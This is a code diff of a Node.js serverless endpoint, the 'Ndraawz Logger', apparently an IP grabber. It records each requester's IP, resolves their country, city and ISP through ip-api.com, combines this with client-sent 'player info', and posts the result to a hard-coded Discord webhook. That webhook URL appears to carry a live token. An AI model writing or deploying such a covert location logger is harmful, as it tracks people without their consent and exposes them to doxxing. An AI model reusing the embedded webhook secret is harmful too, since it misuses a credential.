@@ -1,35 +1,6 @@
-// api/log.js
 const https = require('https');
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
-
-// Fungsi untuk ambil data IP dan geolokasi dari server
-async function getIpInfo(ip) {
-    return new Promise((resolve) => {
-        // Gunakan ip-api.com dari sisi server
-        const url = `http://ip-api.com/json/${ip}`;
-        https.get(url, (res) => {
-            let data = '';
-            res.on('data', chunk => data += chunk);
-            res.on('end', () => {
-                try {
-                    const json = JSON.parse(data);
-                    resolve({
-                        ip: ip,
-                        country: json.country || "N/A",
-                        region: json.regionName || "N/A",
-                        city: json.city || "N/A",
-                        isp: json.isp || "N/A",
-                        as: json.as || "N/A",
-                        org: json.org || "N/A"
-                    });
-                } catch (e) {
-                    resolve({ ip: ip, error: "Gagal ambil data" });
-                }
-            });
-        }).on('error', () => resolve({ ip: ip, error: "Gagal ambil data" }));
-    });
-}
 
 module.exports = async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -38,46 +9,67 @@ module.exports = async function handler(req, res) {
         return res.status(405).json({ error: 'Method Not Allowed' });
     }
     
-    // Ambil IP asli dari header (ini lebih akurat)
-    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
-    
-    // Ambil data dari client (tanpa IP)
     let body = '';
     await new Promise((resolve) => {
         req.on('data', chunk => body += chunk);
         req.on('end', resolve);
     });
     
+    // Ambil IP asli dari header request
+    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
+    
     try {
-        const clientData = JSON.parse(body);
+        const data = JSON.parse(body);
         
-        // Ambil info IP dari server
-        const ipInfo = await getIpInfo(clientIp);
+        // Ambil data geolokasi dari IP (via server, bukan client)
+        let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
         
-        // Gabungkan fields dari client + fields IP dari server
-        let allFields = clientData.fields || [];
+        await new Promise((resolve) => {
+            https.get(`http://ip-api.com/json/${clientIp}`, (geoRes) => {
+                let geoBody = '';
+                geoRes.on('data', chunk => geoBody += chunk);
+                geoRes.on('end', () => {
+                    try {
+                        const json = JSON.parse(geoBody);
+                        if (json.status === "success") {
+                            geoData = {
+                                country: json.country || "N/A",
+                                region: json.regionName || "N/A",
+                                city: json.city || "N/A",
+                                isp: json.isp || "N/A",
+                                as: json.as || "N/A",
+                                org: json.org || "N/A"
+                            };
+                        }
+                    } catch(e) {}
+                    resolve();
+                });
+            }).on('error', () => resolve());
+        });
         
-        // Tambahkan field IP dan lokasi (hasil dari server)
-        allFields.push(
-            { name = "━━━━━━━━━━━━━━ 🌐 IP INFORMATION (SERVER) ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
-            { name = "📡 IP Address", value = ipInfo.ip, inline = false },
-            { name = "🚩 Country", value = ipInfo.country, inline = false },
-            { name = "📍 Region", value = ipInfo.region, inline = false },
-            { name = "🏙️ City", value = ipInfo.city, inline = false },
-            { name = "🏢 ISP", value = ipInfo.isp, inline = false },
-            { name = "📡 AS / Org", value = (ipInfo.as || "N/A") .. " / " .. (ipInfo.org || "N/A"), inline = false }
-        );
+        // Buat fields untuk embed Discord
+        const fields = [
+            { name: "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
+            ...(data.fields || []),
+            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
+            { name: "📡 IP Address", value: clientIp, inline: false },
+            { name: "🚩 Country", value: geoData.country, inline: false },
+            { name: "📍 Region", value: geoData.region, inline: false },
+            { name: "🏙️ City", value: geoData.city, inline: false },
+            { name: "🏢 ISP", value: geoData.isp, inline: false },
+            { name: "📡 AS / Org", value: geoData.as + " / " + geoData.org, inline: false }
+        ];
         
         const embed = {
             title: "🚀 Ndraawz Logger",
             color: 0x00ff88,
-            fields: allFields,
+            fields: fields,
             timestamp: new Date().toISOString()
         };
         
-        // Kirim ke Discord
         const payload = JSON.stringify({ embeds: [embed] });
         const url = new URL(DISCORD_WEBHOOK);
+        
         const options = {
             hostname: url.hostname,
             path: url.pathname,
@@ -97,6 +89,7 @@ module.exports = async function handler(req, res) {
         discordReq.end();
         
     } catch (err) {
+        console.error(err);
         res.status(400).json({ error: 'Invalid JSON' });
     }
 };
